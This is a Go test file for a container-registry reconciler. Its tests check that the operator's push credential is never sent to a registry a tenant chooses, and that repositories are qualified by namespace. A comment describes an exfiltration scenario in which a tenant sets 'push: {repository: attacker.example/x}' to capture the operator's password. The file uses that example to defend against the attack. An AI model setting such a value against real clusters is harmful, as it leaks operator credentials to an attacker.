package reconciler

import "testing"

// The operator's registry credential is installed by the chart and lives in the CONTROLLER's
// namespace. Every object in the cluster is reconciled by that controller, so the rule deciding when
// that credential is used is a security boundary, not a convenience.
//
// The failure it prevents: a tenant who can create an ImageComposition sets
//
//	push: {repository: attacker.example/x}
//
// and the controller authenticates to attacker.example with the operator's registry password. The
// tenant chooses the host; the operator supplies the credential. That is exfiltration wearing the
// shape of a feature, and nothing about it looks wrong in a log.
func TestTheOperatorCredentialNeverReachesATenantChosenRegistry(t *testing.T) {
	d := DefaultRegistry{
		Host:       "registry.internal:5000",
		SecretName: "operator-push",
		Namespace:  "oci-composer",
	}

	for _, tc := range []struct {
		name        string
		ownSecret   string
		usesDefault bool
		wantName    string
		wantNS      string
	}{
		{
			name:        "the object chose its own registry: no credential at all",
			usesDefault: false,
			wantName:    "", wantNS: "",
		},
		{
			name:        "the object chose its own registry AND its own secret",
			ownSecret:   "tenant-creds",
			usesDefault: false,
			wantName:    "tenant-creds", wantNS: "team-a",
		},
		{
			name:        "the operator chose the registry: the operator's credential",
			usesDefault: true,
			wantName:    "operator-push", wantNS: "oci-composer",
		},
		{
			// An explicit secretRef wins even on the default target: the object asked for a
			// specific credential, and silently substituting a more privileged one is worse than
			// honouring what was written.
			name:        "an explicit secret wins over the operator's",
			ownSecret:   "tenant-creds",
			usesDefault: true,
			wantName:    "tenant-creds", wantNS: "team-a",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			name, ns := d.CredentialFor("team-a", tc.ownSecret, tc.usesDefault)
			if name != tc.wantName || ns != tc.wantNS {
				t.Errorf("CredentialFor = (%q, %q), want (%q, %q)", name, ns, tc.wantName, tc.wantNS)
			}
		})
	}
}

// The credential is read from the controller's namespace, never the object's. Reading it from the
// object's namespace would mean a tenant could create a Secret of that name and have the controller
// push with it -- and, worse, that the operator's own credential would be invisible to the cluster
// admin who installed it.
func TestTheDefaultCredentialComesFromTheControllersNamespace(t *testing.T) {
	d := DefaultRegistry{Host: "r:5000", SecretName: "operator-push", Namespace: "oci-composer"}

	_, ns := d.CredentialFor("some-tenant", "", true)
	if ns != "oci-composer" {
		t.Errorf("namespace = %q, want the controller's own; a tenant namespace here means a "+
			"tenant can supply the credential the controller pushes with", ns)
	}
}

// Namespace-qualified, because one registry is now shared by the whole cluster. Two namespaces both
// containing an "app" would otherwise publish to the same repository, and the collision would be
// resolved by whichever reconciled last -- under a tag policy that would read it as a legitimate
// conflict rather than as two unrelated objects colliding.
func TestTheDefaultRepositoryIsNamespaceQualified(t *testing.T) {
	d := DefaultRegistry{Host: "registry.internal:5000"}

	a := d.RepositoryFor("team-a", "app")
	b := d.RepositoryFor("team-b", "app")
	if a == b {
		t.Fatalf("two namespaces share the repository %q", a)
	}
	if want := "registry.internal:5000/team-a/app"; a != want {
		t.Errorf("RepositoryFor = %q, want %q", a, want)
	}

	// A host carrying a path prefix is a supported way to share one registry between clusters.
	withPrefix := DefaultRegistry{Host: "registry.internal:5000/staging/"}
	if got, want := withPrefix.RepositoryFor("team-a", "app"),
		"registry.internal:5000/staging/team-a/app"; got != want {
		t.Errorf("with a prefix = %q, want %q", got, want)
	}
}

// Unconfigured means unconfigured: nothing should half-work by producing a repository with an empty
// host, which would publish to a path that reads as a Docker Hub reference.
func TestAnUnconfiguredDefaultIsNotUsable(t *testing.T) {
	var d DefaultRegistry
	if d.Configured() {
		t.Error("an empty DefaultRegistry reports itself configured")
	}
	name, _ := d.CredentialFor("team-a", "", true)
	if name != "" {
		t.Errorf("credential %q offered with no registry configured", name)
	}
}
